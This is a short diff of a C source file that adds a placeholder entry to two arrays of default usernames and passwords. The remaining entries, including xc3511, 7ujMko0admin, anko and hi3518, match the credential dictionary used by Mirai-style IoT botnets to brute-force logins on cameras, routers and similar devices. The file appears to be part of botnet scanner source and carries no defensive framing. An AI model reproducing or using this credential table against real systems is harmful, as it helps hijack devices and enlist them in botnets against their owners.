@@ -1,6 +1,7 @@
 #include <stddef.h>
 
 const char *usernames[] = {
+"ETO_ZAGLYSHKA_NE_UDALAYT",
 "user", "service", "pi", "tech", 
 "guest", "cactiuser", "administrator", "888888", 
 "Administrator", "informix", "admin", 
@@ -8,6 +9,7 @@ const char *usernames[] = {
 "root", "nagios", "support", "ubnt", "mother", NULL};
 
 const char *passwords[] = {
+"ETO_ZAGLYSHKA_NE_UDALAYT",
 "admin", "root", "user", "123456", "password", "service", "dreambox", "xmhdipc", "hi3518", 
 "jvbzd", "realtek", "anko", "xc3511", "tech", 
 "guest", "7ujMko0admin", "admin1234", "meinsm", 
